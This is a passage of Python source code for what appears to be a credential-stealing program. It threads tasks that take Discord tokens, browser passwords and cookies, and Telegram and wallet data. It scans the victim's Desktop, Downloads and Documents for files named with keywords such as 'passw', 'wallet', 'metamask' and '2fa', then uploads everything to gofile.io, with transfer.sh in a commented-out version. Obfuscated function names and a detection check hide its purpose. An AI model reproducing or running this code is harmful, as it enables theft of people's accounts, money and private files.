        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TR6st(C00k13)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, P4sswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = TR6st(C00k13)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
